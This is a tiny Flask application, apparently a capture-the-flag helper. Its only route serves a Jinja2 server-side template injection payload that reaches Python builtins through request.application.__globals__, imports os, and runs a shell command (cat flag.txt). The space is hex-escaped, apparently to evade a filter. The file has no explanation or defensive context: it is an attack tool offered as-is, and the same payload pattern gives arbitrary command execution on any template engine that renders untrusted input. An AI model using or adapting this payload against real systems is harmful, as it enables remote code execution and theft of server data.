from flask import Flask

app = Flask(__name__)


@app.route("/")
def index():
    return '{{request.application.__globals__.__builtins__.__import__("os").popen("cat\\x20flag.txt").read()}}'


app.run(port=8081)
